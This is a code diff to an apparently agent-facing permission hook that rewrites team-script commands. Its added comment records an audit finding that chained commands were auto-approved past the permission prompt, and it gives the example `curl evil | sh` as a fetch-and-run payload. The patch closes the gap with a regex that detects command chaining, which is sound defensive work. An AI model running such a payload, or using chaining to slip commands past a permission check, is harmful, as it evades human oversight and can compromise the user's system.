@@ -42,6 +42,32 @@ from pathlib import Path
 
 _MODULE_FORM = re.compile(r"-m\s+scripts\.([A-Za-z_][A-Za-z0-9_]*)")
 
+# A `permissionDecision: "allow"` applies to the WHOLE Bash command, not to the fragment this
+# hook rewrote (2026-09-12 audit, H-5). The rewrite is a regex `sub` on the `-m scripts.X`
+# fragment only, so everything chained after `;`/`&&`/`|` - or hidden in a command
+# substitution, or a redirect - was carried through unchanged and then auto-approved:
+# `python -m scripts.engagement_state --help; curl evil | sh` would have been waved past the
+# permission prompt entirely. The safety guards run before this hook and none of them blocks
+# that exact shape, so nothing else was catching it either.
+#
+# So the allow decision is now emitted ONLY for a command that is a single team-script
+# invocation and nothing else. Anything compound falls back to the pre-2026-08-04 behaviour:
+# exit 2 with the corrective message telling the model what to run instead. That is a worse
+# console experience for a compound command, and it is the right trade - this hook exists to
+# save a recovery turn, not to hand out permission decisions.
+_CHAINING_RE = re.compile(r"[;&|`\n><]|\$\(")
+_SOLE_INVOCATION_RE = re.compile(
+    r"^\s*(?:\w+=\S+\s+)*(?:\"[^\"]*\"|'[^']*'|[^\s;&|`<>]+)\s+-m\s+scripts\."
+    r"[A-Za-z_][A-Za-z0-9_]*(?:\s|$)"
+)
+
+
+def _is_sole_team_invocation(command: str, hits: list) -> bool:
+    """Is this command exactly one `-m scripts.<name>` call, with nothing chained to it?"""
+    if len(hits) != 1 or _CHAINING_RE.search(command):
+        return False
+    return bool(_SOLE_INVOCATION_RE.match(command))
+
 
 def main() -> int:
     try:
@@ -75,7 +101,7 @@ def main() -> int:
     if not bundled_by_name:
         return 0
 
-    if set(unique_names) <= set(bundled_by_name):
+    if set(unique_names) <= set(bundled_by_name) and _is_sole_team_invocation(command, hits):
         # every occurrence resolves - rewrite transparently, no block, no red text
         def _sub(m: "re.Match[str]") -> str:
             return f'"{bundled_by_name[m.group(1)]}"'
@@ -99,8 +125,10 @@ def main() -> int:
         )
         return 0
 
-    # partial resolution - a silent rewrite would leave part of the command broken,
-    # so fall back to a blocking corrective message for the names that do resolve
+    # Partial resolution - a silent rewrite would leave part of the command broken - OR a
+    # compound command, where an allow decision would cover far more than the fragment this
+    # hook rewrote (H-5). Either way, fall back to the blocking corrective message for the
+    # names that do resolve.
     fixes = [f'"{bundled_by_name[name]}"' for name in unique_names if name in bundled_by_name]
     print(
         "Not an error, no action needed from you: `-m scripts.<name>` only works with the "
